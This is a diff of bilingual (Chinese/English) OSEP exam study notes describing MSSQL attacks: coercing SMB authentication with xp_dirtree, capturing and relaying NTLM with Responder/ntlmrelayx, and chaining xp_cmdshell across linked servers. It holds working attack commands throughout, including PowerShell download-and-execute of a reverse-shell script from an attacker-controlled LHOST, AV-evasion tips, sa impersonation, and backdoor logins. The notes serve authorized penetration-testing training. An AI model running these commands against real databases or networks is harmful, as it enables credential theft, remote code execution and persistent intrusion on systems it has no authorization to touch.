@@ -1,31 +1,27 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module 11 — MSSQL —— 认证触发、凭据捕获/中继与 Linked Server
+# 模块 M11：MSSQL —— 认证触发、凭据捕获/中继与 Linked Server
 
-Login is not xp_cmdshell. Impersonate, linked servers, or trigger outbound SMB auth.
-
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> Covers scenarios：44、45
-> > Course mapping：场景 44 → C4；场景 45 → C2、C6
-> Prerequisites：一个可登录的 SQL Server 实例（SQL 认证或 Windows 认证均可）；attacker box（Kali）可被目标实例反向访问（445/SMB 出方向不被拦）；PowerUpSQL / SQLRecon / Impacket / Responder / ntlmrelayx / hashcat 按场景准备
+> 覆盖场景：44、45
+> > 教材依据：场景 44 → C4；场景 45 → C2、C6
+> 前置依赖：一个可登录的 SQL Server 实例（SQL 认证或 Windows 认证均可）；攻击机（Kali）可被目标实例反向访问（445/SMB 出方向不被拦）；PowerUpSQL / SQLRecon / Impacket / Responder / ntlmrelayx / hashcat 按场景准备
 
 ---
 
-## Scenario 44：SQL 账户能登录，但不能运行系统命令
+## 场景 44：SQL 账户能登录，但不能运行系统命令
 
-**Situation**：我们只有一个低权限数据库登录，`xp_cmdshell` / OLE / CLR 等命令执行通道全部不可用；但该 SQL 会话身份可以触发**对外网络认证**（UNC/SMB 请求），而环境中存在一台满足 SMB 中继条件（签名未强制）的另一主机，或我们可以离线破解捕获到的 Net-NTLMv2。
+**场景回顾**：我们只有一个低权限数据库登录，`xp_cmdshell` / OLE / CLR 等命令执行通道全部不可用；但该 SQL 会话身份可以触发**对外网络认证**（UNC/SMB 请求），而环境中存在一台满足 SMB 中继条件（签名未强制）的另一主机，或我们可以离线破解捕获到的 Net-NTLMv2。
 
-**Assumptions**：
+**前提与假设**：
 - 已有一个可登录的 SQL 登录：SQL 认证（`USER`/`PASS`）或域 Windows 认证（`DOMAIN\USER`）。
 - 该登录**不是** `sysadmin`，无法开 `xp_cmdshell`（这是本场景的失败点，先确认再走中继路线）。
 - 目标实例可以发起向 `\\LHOST\...` 的 SMB 请求（SQL Server 进程以域账户或机器账户运行，能走 SMB 出方向；若出网受限，见"失败分支"用隧道）。
-- attacker box侧提前准备好：`Responder`、`impacket-ntlmrelayx`、`hashcat` + 字典、PowerUpSQL 模板脚本、反弹 shell 载荷。
+- 攻击机侧提前准备好：`Responder`、`impacket-ntlmrelayx`、`hashcat` + 字典、PowerUpSQL 模板脚本、反弹 shell 载荷。
 - 目标主机的 SMB 签名状态未知——先探测，决定"捕获"还是"中继"路线。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 
 1. 确认工具齐全：
    ```bash
@@ -41,11 +37,11 @@ Switch to **中文** in the header for the original full narrative. Lab listings
    python3 -m http.server 80
    ```
 
-3. （可选）如果 SQL 实例在内网、与attacker box不在同一网段，先用 Ligolo-ng 打通回程（`Tunneling` → Ligolo-ng）：在代理会话里加监听并把attacker box 445 映射过去：
+3. （可选）如果 SQL 实例在内网、与攻击机不在同一网段，先用 Ligolo-ng 打通回程（`Tunneling` → Ligolo-ng）：在代理会话里加监听并把攻击机 445 映射过去：
    ```
    listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
    ```
-   记录最终attacker box在目标视角可达的 IP 为 `LHOST`。
+   记录最终攻击机在目标视角可达的 IP 为 `LHOST`。
 
 4. 探测中继目标（要打的那台另一主机）的 SMB 签名：
    ```bash
@@ -54,9 +50,9 @@ Switch to **中文** in the header for the original full narrative. Lab listings
    #       Message signing enabled and required     → 只能走"捕获+破解"
    ```
 
-**Procedure**：
+**执行步骤**：
 
-1. 用低权限登录连接实例，确认当前权限状态（先Verify"确实不能执行系统命令"）：
+1. 用低权限登录连接实例，确认当前权限状态（先验证"确实不能执行系统命令"）：
    ```bash
    # 从 Kali（SQL 认证）
    impacket-mssqlclient USER:PASS@TARGET -windows-auth    # 域账号用 DOMAIN/USER:PASS@TARGET
@@ -141,7 +137,7 @@ Switch to **中文** in the header for the original full narrative. Lab listings
    ```
    详见 `m11-powerupsql-templates.ps1`（模拟、CLR 等模板）与场景 45（Linked Server 路线）。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m11-responder-relay-sql.sh` | 一键起 Responder 捕获 / ntlmrelayx 中继 + 打印 SQL 触发命令 | `LHOST`、`LPORT`、`TARGET` |
@@ -638,19 +634,19 @@ SELECT * FROM OPENQUERY([LINK1],
 -- ============================================================================
 ````
 
-**Verify**：
-- Responder 窗口出现 `[SMB] NTLMv2-SSP Hash` 行 → 捕获成功；hashcat 出明文 → 凭据可用（`netexec smb` 或 `evil-winrm` Verify）。
+**验证**：
+- Responder 窗口出现 `[SMB] NTLMv2-SSP Hash` 行 → 捕获成功；hashcat 出明文 → 凭据可用（`netexec smb` 或 `evil-winrm` 验证）。
 - ntlmrelayx 出现 `Authenticating ... SUCCEED` 与 `Executed specified command on host` → 中继执行成功；反向 shell 端出现连接。
 - 若只是想要一个稳定的回连，检查 `nc -nvlp LPORT` 收到连接并交互 `whoami`。
 
-**If it fails**：
+**失败分支与备选**：
 1. `xp_dirtree` 被拒绝（低权限也报 `EXECUTE permission denied`）→ 逐个试同类扩展存储过程：`EXEC master..xp_subdirs '\\LHOST\x';`、`EXEC master..xp_fileexist '\\LHOST\x';`；仍不行则找数据库内**以 sysadmin 身份定义的存储过程/触发器/作业**或 `EXECUTE AS` 可模拟对象（`Invoke-SQLAuditPrivImpersonateLogin`），在其内部触发 UNC。
 2. 目标 SMB 强制签名 → 中继不可行 → 切路线 A（Responder 捕获 + hashcat 破解），或寻找 HTTP/HTTPS/LDAP 型中继目标（`ntlmrelayx -t http://...` / `-t ldap://...`，用于未启用 EPA 的 HTTP 服务，参考 M12 场景 55 的 ESC8 思路）。
 3. SQL 主机无法出网到 `LHOST`（回程被防火墙拦）→ 用 Ligolo-ng 在可达主机上开 `listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445`，把触发目标从 `\\LHOST\` 改为 `\\<ligolo监听地址>\`（详见 M08 `Tunneling` 章节）。
 4. Responder 与 ntlmrelayx 端口冲突 / 环境里其它主机在抢 445 → 只开一个服务；Responder 换接口或用 `-w`/`-r` 精确控制；确认没有把 Responder 和 relayx 同时挂 445。
 5. 中继命令被 AV 拦（payload 落地被杀）→ 换内存加载（`-c "powershell ..."` 直接 IEX 下载字符串）、分阶段或换编码（M05/M07 方法）。
 
-**Exam notes / OPSEC**：
+**考试注意 / OPSEC**：
 - Responder / ntlmrelayx 监听 445 会短暂影响该网段正常 SMB 流量；在考试网小心别把 DC 的认证也引过来造成"账户锁定"类噪音，建议 `responder -I <iface>` 后立即触发并尽快完成。
 - `xp_dirtree` 等触发动作会出现在 SQL Server 的错误日志/Profiler 中；实验环境无妨，正式环境先评估。
 - 中继拿到的身份**不是**交互式凭据：用它横向时优先 SMB/服务类（wmiexec、psexec），别浪费时间去试 RDP（除非该账号有 Remote Desktop Users 组）。
@@ -658,17 +654,17 @@ SELECT * FROM OPENQUERY([LINK1],
 
 ---
 
-## Scenario 45：Linked Server 能查询，但远程执行失败
+## 场景 45：Linked Server 能查询，但远程执行失败
 
-**Situation**：我们已能访问实例 A，它配置了指向实例 B（甚至 C）的 Linked Server；A 上查询 B 的数据可以成功，但只要涉及**远程执行**（`EXEC ... AT B`、`xp_cmdshell` on B、跨服务器 RPC）就失败。原因通常落在三处：B 端的**映射登录**权限低、A→B 的 **RPC/RPC Out** 未开、以及**两端权限配置不一致**（例如 A 是 sysadmin，映射到 B 却只是 public）。
+**场景回顾**：我们已能访问实例 A，它配置了指向实例 B（甚至 C）的 Linked Server；A 上查询 B 的数据可以成功，但只要涉及**远程执行**（`EXEC ... AT B`、`xp_cmdshell` on B、跨服务器 RPC）就失败。原因通常落在三处：B 端的**映射登录**权限低、A→B 的 **RPC/RPC Out** 未开、以及**两端权限配置不一致**（例如 A 是 sysadmin，映射到 B 却只是 public）。
 
-**Assumptions**：
+**前提与假设**：
 - 有实例 A 的有效登录（SQL 认证或 Windows 认证），在 A 上至少 `public`，很可能更低权限。
 - A 上已能看到名为 `LINKED_B`（本文用 `TARGET2` 表示其 host）的 Linked Server，`SELECT` 能通（否则先解决连通性/凭据问题，不属本场景失败点）。
 - 本场景把 A 记为"源实例"，B 为"一跳"，C 为"二跳"（A→B→C）。
 - 准备好：`impacket-mssqlclient`（Linux）或 PowerUpSQL/SQLRecon（Windows）、`m11-linked-server-queries.sql`。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 1. 连接源实例 A：
    ```bash
    impacket-mssqlclient USER:PASS@A_HOST        # SQL 认证
@@ -681,9 +677,9 @@ SELECT * FROM OPENQUERY([LINK1],
    FROM sys.servers;
    ```
    预期至少一行 `is_linked = 1`。
-3. 准备"短 payload"思想：通过 Linked Server 执行的长命令极易因引号/长度出错；把长内容做成 **URL 下载**（`http://LHOST/x.ps1`）只让远端执行最短命令，payload 文件放attacker box HTTP 目录，见脚本模板注释。
+3. 准备"短 payload"思想：通过 Linked Server 执行的长命令极易因引号/长度出错；把长内容做成 **URL 下载**（`http://LHOST/x.ps1`）只让远端执行最短命令，payload 文件放攻击机 HTTP 目录，见脚本模板注释。
 
-**Procedure**：
+**执行步骤**：
 
 1. 确认"能查询但不能执行"的具体边界——逐项测，按顺序排查：
    ```sql
@@ -749,7 +745,7 @@ SELECT * FROM OPENQUERY([LINK1],
    -- 方式 3：整条 base64（引号最少）：
    EXEC ('EXEC master..xp_cmdshell ''powershell -enc <BASE64>''') AT TARGET2;
    ```
-   若要回连：attacker box先 `nc -nvlp LPORT`，HTTP 目录放 run.ps1（内容 = 反弹 shell 下载执行）。
+   若要回连：攻击机先 `nc -nvlp LPORT`，HTTP 目录放 run.ps1（内容 = 反弹 shell 下载执行）。
 
 7. **多跳（A→B→C）模板**——核心是"在 A 上对 B 发一条 EXEC，让 B 再对 C 发一条 EXEC"：
    ```sql
@@ -775,7 +771,7 @@ SELECT * FROM OPENQUERY([LINK1],
      ```
      考试里"加登录"这类持久化动作按考点决定是否执行，先确认题目目标。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m11-linked-server-queries.sql` | 链接枚举 / 单跳 / 多跳 / `EXEC ... AT` 全套模板（引号标注） | 替换 `TARGET2`/`TARGET3` 等 |
@@ -783,13 +779,13 @@ SELECT * FROM OPENQUERY([LINK1],
 | `m11-sqlrecon-templates.ps1` | SQLRecon 的 link 模块对照（links / linkquery / linkcmd） | `/h:A_HOST /m:linkquery` |
 | `m11-responder-relay-sql.sh` | 若 B 是"中继目标"时的收尾路线 | `TARGET` |
 
-**Verify**：
+**验证**：
 - `EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT TARGET2` 返回 B 的主机名与远端用户 → RPC 通。
 - 步骤 5 的 `xp_cmdshell 'whoami'` 返回形如 `nt service\mssql$...` 或 `DOMAIN\svc_sql` → 远端命令执行成功。
 - 多跳执行返回 C 的 `whoami` → 链路完整。
 - 反向 shell 监听端收到连接。
 
-**If it fails**：
+**失败分支与备选**：
 1. `EXEC ... AT` 报"not configured for RPC" → 尝试以可模拟的 sysadmin 身份执行 `sp_serveroption 'TARGET2','rpc out','true'`（`EXECUTE AS LOGIN='sa'`），不可模拟时改用 `OPENQUERY` 只读路线或找新的凭据；没有 RPC Out 时**无法**远程调用存储过程/xp_cmdshell，只能数据查询。
 2. 远端能执行但不是 sysadmin（`xp_cmdshell` 拒绝）→ 在 B 端做**登录枚举 + 模拟**：`EXEC ('SELECT name FROM sys.server_principals WHERE type IN (''U'',''S'')') AT TARGET2`；用 PowerUpSQL `Invoke-SQLAuditPrivImpersonateLogin -Exploit` 找到可模拟成 sysadmin 的登录再执行。
 3. 多跳时报 `NT AUTHORITY\ANONYMOUS LOGON` / Kerberos 委派错误 → B→C 的链路需要"传递凭据"，双跳 EXEC 在部分版本/配置下被禁止；备选：直接用 4 部分名做**数据**级访问 `SELECT * FROM [TARGET2]...[sysservers]`，或从 B 拉出 C 的连接信息后**直连 C**（若端口可达），或对 B 做完整控制后在其上加凭据直连 C。
@@ -797,9 +793,9 @@ SELECT * FROM OPENQUERY([LINK1],
 5. `OPENQUERY` 报 OLE DB / 分布式查询被禁 → 需要 `data access=true`（需 sysadmin）；没有时把 B 的数据用普通 `SELECT` 循环取回 A，不追求远端就地执行。
 6. A 本身是低权限且无 sysadmin 可模拟 → 回到场景 44 的"触发对外认证 + 中继"路线，把 A 的 SQL 服务账号引到别的目标上。
 
-**Exam notes / OPSEC**：
+**考试注意 / OPSEC**：
 - **引号转义是最大丢分点**：写远程字符串时心里过一遍"当前在第几层"，在脚本模板里复制、只改服务器名，别手写嵌套。
-- 远程启用 `xp_cmdshell` 会立即被 DBA/EDR 类监控关注（SQL Server 有审计事件）；做完Verify动作后若题目不需要可考虑关闭：`EXEC ('EXEC sp_configure ''xp_cmdshell'',0; RECONFIGURE;') AT TARGET2`。
+- 远程启用 `xp_cmdshell` 会立即被 DBA/EDR 类监控关注（SQL Server 有审计事件）；做完验证动作后若题目不需要可考虑关闭：`EXEC ('EXEC sp_configure ''xp_cmdshell'',0; RECONFIGURE;') AT TARGET2`。
 - `sp_addlogin` 加后门登录属持久化动作：考试中只在题目明确要求或常规授权环境使用，记录并事后清理。
 - 先确定本场景拿到的到底是"数据访问权"还是"服务器控制权"：很多题目只需要你用 Linked Server 读 B 里某个表（那就别折腾 xp_cmdshell），先按最小权限原则满足题目。
 
